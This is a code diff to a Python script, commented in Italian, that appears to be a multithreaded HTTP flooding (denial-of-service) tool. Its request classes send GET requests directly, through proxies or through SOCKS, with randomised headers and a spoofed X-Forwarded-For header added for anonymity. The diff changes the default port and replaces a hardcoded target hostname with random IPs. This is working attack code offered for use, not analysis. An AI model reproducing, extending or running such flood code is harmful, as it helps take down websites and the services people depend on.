@@ -65,7 +65,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 		try:
 			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
 		except:
-			urlport = "443"
+			urlport = "80"
 
 	proxymode()
 
@@ -217,7 +217,7 @@ class RequestProxyHTTP(threading.Thread): # la classe del multithreading
 		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
 		if choice1 == "1":
 			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: clumstore.com\r\n"
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		else:
 			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
 		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
@@ -252,7 +252,7 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 		accept = random.choice(acceptall) # scelta accept a caso
 		if choice1 == "1":
 			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: clumstore.com\r\n"
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		else:
 			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
 		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
@@ -302,7 +302,7 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 		accept = random.choice(acceptall) # accept a caso
 		if choice1 == "1":
 			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: clumstore.com\r\n"
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		else:
 			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
 		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
